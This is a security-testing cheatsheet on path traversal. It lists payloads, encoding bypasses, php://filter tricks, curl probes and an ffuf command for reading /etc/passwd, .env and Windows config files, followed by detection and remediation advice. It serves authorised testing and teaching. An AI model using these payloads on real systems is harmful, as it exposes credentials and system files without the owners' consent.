# Path / Directory Traversal Cheatsheet

> Quick reference for discovery, payloads, detection, and remediation. Only test on systems you are authorized to assess.

## High-level testing approach

1. Discover candidate inputs
   - Look for parameters or URL path segments that reference files: `file`, `filename`, `path`, `img`, `download`, `doc`, `resource`, `/load`, `/get`, `/download`.
   - Inspect `src`, `href`, form parameters, JS fetch/XHR, and API endpoints. Check single-page app routes and JSON responses.

2. Basic traversal probe
   - Try simple directory-up sequences:
     - `?file=../etc/passwd`
     - `?file=../../../../etc/passwd`
   - On Windows hosts try backslashes:
     - `?file=..\..\Windows\win.ini`

3. Look for tell-tale responses
   - Success indicators: `root:x:0:0:` (from `/etc/passwd`), common Windows INI sections (`[fonts]`, `for 16-bit`), `.env` contents like `APP_ENV=`, or human-readable config/log fragments.
   - Other clues: HTTP status changes (200 vs 404/500), large content-length jump, `content-type` that differs from expected (e.g., `text/plain` returned for an image), or stack traces and filepath leaks.

4. Iterate depth & file targets
   - Increase `../` depth until root or until content changes. Some apps strip `..` — try evasion variants below.
   - Common sensitive files to test:
     - Unix: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/var/log/apache2/access.log`, `/var/www/config.php`, `.env`
     - Windows: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config`

5. Bypass & encoding techniques
   - URL-encode: `%2e%2e%2f` = `../`, `%2e%2e%5c` = `..\`
   - Double-encode: `%252e%252e%252f` (some filters decode once)
   - Mixed encodings / UTF-8 overlong: `..%c0%af` / `..%c0%2f` (older servers)
   - Null byte: `%00` (rarely effective on modern runtimes; historically used to truncate appended extensions)
   - Alternate separators and tricks: `....//`, `..;/`, `..%2f.` , `/%2e%2e/`
   - File wrappers (PHP): `php://filter/convert.base64-encode/resource=../../config.php` — forces textual/base64 output for non-text files

6. Extension / whitelist workarounds
   - If app enforces extensions (e.g., `.png`), try:
     - Null-byte (legacy): `../../../../etc/passwd%00.png`
     - Path normalization tricks: `../../../etc/passwd/` or `../../../etc/passwd%2F..%2F218.png`
     - Append `/.` to the filename (some path normalizers treat it differently): `../../../etc/passwd/.`
     - Use a file wrapper to get text output even if the server treats it as image.

7. Directory listing and index exposure
   - Request directory paths (URL-encoded) and look for indices/listings: `?file=..%2F..%2Fvar%2Fwww%2Fimages%2F`

8. Confirm & fingerprint
   - Confirm server-sourced content (e.g., `/etc/passwd` lines, `.env` with `APP_ENV`) and check headers (`Server`, `ETag`) or timing to fingerprint stack.

## Useful payloads (quick list)

- `../etc/passwd`
- `../../../../etc/passwd`
- `..%2f..%2f..%2fetc%2fpasswd`
- `..%5c..%5c..%5cwindows%5cwin.ini`
- `php://filter/convert.base64-encode/resource=../../config.php`
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` (double-encoded)
- `..;/../..;/etc/passwd`
- `/etc/passwd` (absolute path)
- `C:\Windows\System32\drivers\etc\hosts` (Windows absolute)

## Example curl tests

- Basic probe:

```bash
curl -i "https://target/loadImage?filename=../../../../etc/passwd"
```

- If the server responds with base64 (using php://filter):

```bash
curl -s "https://target/loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php" | base64 -d
```

## Fuzzing / automation

- ffuf example:

```bash
ffuf -u "https://target/loadImage?filename=FUZZ" -w path_traversal_payloads.txt -mc 200,403 -fs 0
```

- wfuzz / dirsearch or Burp Intruder can be used to inject payload lists into parameters or path segments.

## Detection heuristics & false positives

- Content matching: look for `root:`, `bin:`, `[fonts]`, `Microsoft Windows` strings.
- Content-length spikes: a sudden large response suggests file contents returned.
- Content-type mismatch: expected `image/png` but got `text/plain`/`text/html`.
- Error output: stack traces, explicit path errors, or file-not-found messages.
- Base64 responses: decode and inspect.

## Source/CI checks — how developers should fix

- Canonicalize the path server-side (resolve to an absolute path) and verify it starts with the allowed base directory.
- Use a whitelist of allowed filenames or map IDs → filenames instead of using raw input.
- Avoid naive string-based checks that only reject `..` — check the resolved path.
- Run static analysis or CI checks that detect usage of raw file paths (e.g., `open(base + filename)` without canonicalization).

## Remediation checklist (brief)

- Resolve to an absolute path and ensure it is inside the allowed base directory.
- Use server-side whitelists or mapping from IDs to files.
- Normalize/validate inputs and apply least privilege on filesystem access.
- Log and monitor attempts to access unexpected paths.

## Notes & safety

- Only test systems you are authorized to test (PortSwigger labs / your own systems). Some encoding/evade payloads can trigger WAFs or cause unexpected behavior.
- Keep a record of exact request/response pairs for reporting.

## References

- PortSwigger: Directory traversal labs
- OWASP: Path Traversal
- PHP wrappers: `php://filter` tricks for disclosure
